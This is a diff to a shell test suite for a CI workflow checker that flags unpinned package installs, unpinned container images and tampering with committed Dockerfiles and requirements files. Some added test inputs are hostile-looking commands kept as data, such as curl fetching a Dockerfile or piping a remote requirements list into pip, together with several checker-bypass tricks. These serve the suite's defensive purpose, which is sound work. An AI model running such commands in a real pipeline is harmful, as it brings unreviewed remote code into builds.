@@ -701,15 +701,15 @@ case_ pkg-yarn                 bad "$(r 'yarn add left-pad')"
 case_ pkg-bash-c               bad "$(rb 'bash -c "pip install requests"')"
 case_ pkg-eval                 bad "$(rb 'eval "pip install requests"')"
 case_ img-bash-c               bad "$(rb 'sh -c "docker run alpine"')"
-case_ pkg-hashed-file          ok  "$(rb 'python3 -m pip install --quiet --require-hashes --only-binary=:all: -r .github/agent/test-requirements.txt')"
-case_ pkg-hashed-venv          ok  "$(rb '"$RUNNER_TEMP/v/bin/pip" install --quiet --require-hashes -r r.txt')"
+case_ pkg-hashed-file          ok  "$(rb 'python3 -m pip install --quiet --require-hashes --only-binary=:all: -r .github/agent/test-requirements.txt')" "mkdir -p .github/agent; printf 'x==1 --hash=sha256:00\\n' > .github/agent/test-requirements.txt"
+case_ pkg-hashed-venv          ok  "$(rb '"$RUNNER_TEMP/v/bin/pip" install --quiet --require-hashes -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
 case_ pkg-hashed-stdin         ok  "$head
     steps:
       - run: |
           python3 -m pip install --quiet --require-hashes --only-binary=:all: -r /dev/stdin <<'REQ'
           pyyaml==6.0.2 --hash=sha256:80bab7bfc629882493af4aa31a4cfa43a4c57c83813253626916b8c7ada83476
           REQ"
-case_ pkg-dry-run              ok  "$(rb 'python3 -m pip install --dry-run --ignore-installed --require-hashes --target /tmp/x -r r.txt')"
+case_ pkg-dry-run              ok  "$(rb 'python3 -m pip install --dry-run --ignore-installed --require-hashes --target /tmp/x -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
 case_ pkg-version-query        ok  "$(r 'pip --version; python3 -m pip --version; python3 bin/x.py install')"
 case_ pkg-echo                 ok  "$(r 'echo pip install requests')"
 
@@ -774,7 +774,7 @@ case_ n2-copied-pip            bad "$(rb 'cp /usr/bin/pip3 /tmp/p')"
 case_ n2-copy-other-file       ok  "$(rb 'cp Dockerfile.production /tmp/Dockerfile && ln -s /tmp/a /tmp/b')"
 case_ n3-pip-download          bad "$(r 'pip download requests')"
 case_ n3-pip-wheel             bad "$(r 'python3 -m pip wheel requests')"
-case_ n3-download-hashed       ok  "$(rb 'pip download --require-hashes -r r.txt -d /tmp/w')"
+case_ n3-download-hashed       ok  "$(rb 'pip download --require-hashes -r r.txt -d /tmp/w')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
 case_ n4-conda                 bad "$(r 'conda install -y requests')"
 case_ n4-mamba                 bad "$(r 'micromamba create -n x python')"
 case_ r1-manifest              bad "$(r 'docker manifest create multi alpine:latest busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
@@ -794,7 +794,7 @@ case_ x2-poetry                bad "$(r 'poetry add requests')"
 case_ x2-pip-sync              bad "$(r 'pip-sync requirements.txt')"
 case_ x2-setup-py              bad "$(r 'python setup.py install')"
 case_ x2-python-m-build        bad "$(r 'python3 -m build')"
-case_ x2-uv-pip-sync-hashed    ok  "$(r 'uv pip sync --require-hashes -r requirements.txt')"
+case_ x2-uv-pip-sync-hashed    ok  "$(r 'uv pip sync --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt"
 case_ x2-python-script         ok  "$(r 'python3 bin/check.py --sync install')"
 
 # --- Sonnet #164 r4 (NEW-3, NEW-4): a decoy Dockerfile; command substitution severing the image argument
@@ -811,5 +811,32 @@ case_ n4-subst-pip             bad "$(rb 'pip install --require-hashes -r r.txt 
 case_ n4-inner-still-read      bad "$(rb 'x=$(docker pull alpine:latest)')"
 case_ n4-nested                bad "$(rb 'docker run $(printf %s $(echo alpine)) true')"
 case_ n4-subst-option-ok       ok  "$(rb 'docker run --name "$(date +%s)" --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"
+
+# --- Sonnet #164 r5 (NEW-5, NEW-6): a committed Dockerfile mutated by any tool; pip -r bound to the repository
+case_ n5-curl-o                bad "$(rb 'curl -fsSL -o Dockerfile https://x.example/D && docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n5-python-write          bad "$(rb 'python3 -c "open(\"Dockerfile\",\"w\").write(\"FROM alpine\")"; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n5-dd                    bad "$(rb 'echo FROM alpine | dd of=Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n5-sed-i                 bad "$(rb 'sed -i s/x/y/ Dockerfile && docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n5-echo-redirect         bad "$(rb 'echo FROM alpine >Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n5-read-only-ok          ok  "$(rb 'cat Dockerfile; sha256sum Dockerfile; grep FROM Dockerfile; docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n6-r-absolute            bad "$(r 'pip install --require-hashes -r /tmp/nonexistent.txt')"
+case_ n6-r-written             bad "$(rb 'printf "x==1 --hash=sha256:00\\n" > r.txt; pip install --require-hashes -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
+case_ n6-r-missing             bad "$(r 'pip install --require-hashes -r reqs/none.txt')"
+case_ n6-r-repo-file           ok  "$(r 'pip install --require-hashes -r reqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
+case_ n6-r-stdin-heredoc       ok  "$head
+    steps:
+      - run: |
+          pip install --require-hashes -r /dev/stdin <<'REQ'
+          x==1 --hash=sha256:00
+          REQ"
+case_ n6-r-stdin-no-heredoc    bad "$(rb 'curl -s https://x.example/r | pip install --require-hashes -r /dev/stdin')"
+case_ n6-r-variable-review     ok  "$(rb 'for f in a b; do pip install --require-hashes -r "$f"; done')"
+case_ n5-copy-into-context     ok  "$(rb 'cp build/docker/Dockerfile.* /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
+case_ n5-copy-from-outside     bad "$(rb 'cp /tmp/evil/Dockerfile.a /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
+case_ n5-copy-onto-name        bad "$(rb 'cp evil.txt Dockerfile.a && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
+case_ n5-touch-in-subst        bad "$(rb 'x=$(sed -i s/a/b/ Dockerfile); docker build -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n6-r-equals-form         ok  "$(r 'pip install --require-hashes --requirement=reqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
+case_ n6-r-attached-form       ok  "$(r 'pip install --require-hashes -rreqs/ok.txt')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
+case_ n6-r-from-subst          bad "$(rb 'pip install --require-hashes -r $(echo reqs/ok.txt)')" "mkdir -p reqs; printf 'x==1 --hash=sha256:00\\n' > reqs/ok.txt"
 echo "check-action-pins: $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
